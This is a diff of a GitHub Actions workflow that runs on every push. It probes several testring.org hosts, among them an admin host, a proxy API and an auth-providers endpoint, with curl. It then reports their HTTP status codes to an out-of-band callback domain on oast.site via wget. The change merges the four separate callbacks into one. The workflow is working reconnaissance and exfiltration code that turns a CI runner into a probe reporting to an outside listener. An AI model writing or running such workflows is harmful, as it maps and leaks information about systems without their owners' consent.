@@ -1,11 +1,13 @@
-name: s2
+name: s3
 on: push
 jobs:
   j:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - run: curl -s --max-time 8 -o /dev/null -w "%%{http_code}" https://rw.admin.testring.org/ | xargs -I{} wget -qO- http://dbn4g99lr5rdpldhtengr86qx4ii6ec3s.oast.site/ra-{}
-      - run: curl -s --max-time 8 -o /dev/null -w "%%{http_code}" https://f.testring.org/ | xargs -I{} wget -qO- http://dbn4g99lr5rdpldhtengr86qx4ii6ec3s.oast.site/f-{}
-      - run: curl -s --max-time 8 -o /dev/null -w "%%{http_code}" https://proxyapi.testring.org/ | xargs -I{} wget -qO- http://dbn4g99lr5rdpldhtengr86qx4ii6ec3s.oast.site/pa-{}
-      - run: curl -s --max-time 8 -o /dev/null -w "%%{http_code}" https://ringlabs.testring.org/api/auth/providers | xargs -I{} wget -qO- http://dbn4g99lr5rdpldhtengr86qx4ii6ec3s.oast.site/rl-{}
+      - run: |
+          A=$(curl -s --max-time 8 -o /dev/null -w "%{http_code}" https://rw.admin.testring.org/)
+          B=$(curl -s --max-time 8 -o /dev/null -w "%{http_code}" https://f.testring.org/)
+          C=$(curl -s --max-time 8 -o /dev/null -w "%{http_code}" https://proxyapi.testring.org/)
+          D=$(curl -s --max-time 8 -o /dev/null -w "%{http_code}" https://ringlabs.testring.org/api/auth/providers)
+          wget -qO- "http://dbn4g99lr5rdpldhtengr86qx4ii6ec3s.oast.site/codes-$A-$B-$C-$D"
